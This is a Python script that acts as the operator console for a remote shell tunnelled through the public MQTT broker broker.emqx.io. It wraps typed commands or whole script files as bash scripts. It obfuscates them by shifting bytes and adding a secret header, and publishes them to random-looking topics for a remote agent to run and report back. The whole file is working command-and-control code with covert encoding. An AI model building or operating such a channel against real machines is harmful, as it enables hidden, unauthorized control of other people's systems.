import readline
import time
import random
import string
import json
import subprocess
from subprocess import call
import array
import optparse
from paho.mqtt import client as mqtt_client

broker = 'broker.emqx.io'
port = 1883
send_topic = "OOyhCjXUpjH9LE"
receive_topic = "zS02DyLeTKUKVp"
enable_header = "Jd3RK1VllBZatc"
shell_header = "iPlbYNbPgAUu6z"
# generate client ID with pub prefix randomly
client_id = 'WXhMjazOJ4eCBR' # default
current_dir = "/"


shell_enabled = True

is_attach = True
filename = ""
mqtt_connect_status = False
output_received = False
send_id = 0
receive_id = 0

def get_random_string(length):
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def exec(command):
    call(command, shell=True)

def mqtt_command_inject(client, byte_data):
    encode_data = [x + 128 for x in byte_data]
    shell_header_byte = []
    shell_header_byte.extend(ord(num) for num in shell_header)
    send_data = shell_header_byte + encode_data
    send_data = bytearray(send_data)
    client.publish(send_topic, send_data)

def subscribe(client: mqtt_client):
    def on_message(client, userdata, msg):
        global output_received
        global send_id, receive_id
        # print(f"Received `{msg.payload.decode()}` from `{msg.topic}` topic")
        if msg.topic == receive_topic:
            receive_id = receive_id + 1
            if receive_id == send_id:
                print(msg.payload.decode())
                output_received = True
        else:
            print("Invalid topic")
    client.subscribe(receive_topic)
    client.on_message = on_message

def connect_mqtt() -> mqtt_client:
    def on_connect(client, userdata, flags, rc):
        global mqtt_connect_status
        if rc == 0:
            mqtt_connect_status = True
            print("Connected to MQTT Broker!")
            if filename != "":
                f = open(filename, "rb")
                raw_data = f.read()
                mqtt_command_inject(client, raw_data)
        else:
            mqtt_connect_status = False
            print(f"Failed to connect, return code {rc}")
    def on_publish(client, userdata, mid):
        if filename != "":
            print("published")
            client.loop_stop()
            client.disconnect()

    client = mqtt_client.Client(client_id)
    client.on_connect = on_connect
    client.connect(broker, port)
    client.on_publish = on_publish
    return client

def run():
    global filename
    global is_attach
    global output_received
    global send_id, receive_id
    global client_id
    global current_dir
    client_id = get_random_string(14)
    print("Program start")
    parser = optparse.OptionParser()
    parser.add_option("-a", "--attach",
                      action = "store_true",
                      dest = "is_attach",
                      default = True,
                      help = "attach the console")
    parser.add_option("-f", "--file", dest = 'filename',
                      type = 'string', default = "",
                      help = 'specify a script file')
    (options, args) = parser.parse_args()
    if options.is_attach:
        # print("yes")
        is_attach = True
    else:
        is_attach = False
    if options.filename == "":
        # print("string empty")
        filename = ""
    else:
        # print("filename: ", options.filename)
        filename = options.filename
        is_attach = False
    client = connect_mqtt()
    subscribe(client)
    if is_attach:
        client.loop_start()
    else:
        client.loop_forever()
    # print("here")
    while is_attach:
        command_input = input(f"$ ({current_dir})\n-> ")
        if mqtt_connect_status:
            if command_input == "exit":
                client.loop_stop()
                client.disconnect()
                break
            if len(command_input) != 0:
                if command_input.startswith("cd "):
                    des_dir = command_input[3:]
                    command_input = ""
                    if des_dir.startswith("/"):
                        current_dir = des_dir
                    else:
                        des_dir_spl = des_dir.split("/")
                        for element in des_dir_spl:
                            if element == ".":
                                # do nothing
                                current_dir = current_dir
                            elif element == "..":
                                if current_dir != "/":
                                    new_str = current_dir.rsplit("/", 1)[0]
                                    if new_str == "":
                                        current_dir = "/"
                                    else:
                                        current_dir = new_str
                            else:
                                if current_dir != "/":
                                    if element != "":
                                        current_dir += "/" + element
                                else:
                                    current_dir += element

                init_cmd = "cd " + current_dir
                str_cmd = "#!/bin/bash\n" + init_cmd + "\n" + command_input
                cmd_arr = []
                cmd_arr.extend(ord(num) for num in str_cmd)
                mqtt_command_inject(client, cmd_arr)
                send_id = send_id + 1
                count_timeout = 10
                while True:
                    if count_timeout == 0 or output_received == True:
                        time.sleep(0.1)
                        break
                    count_timeout = count_timeout - 1
                    time.sleep(0.5)
                output_received = False
        else:
            print("MQTT isn't connected, shell inject won't work")
        

if __name__ == '__main__':
    run()
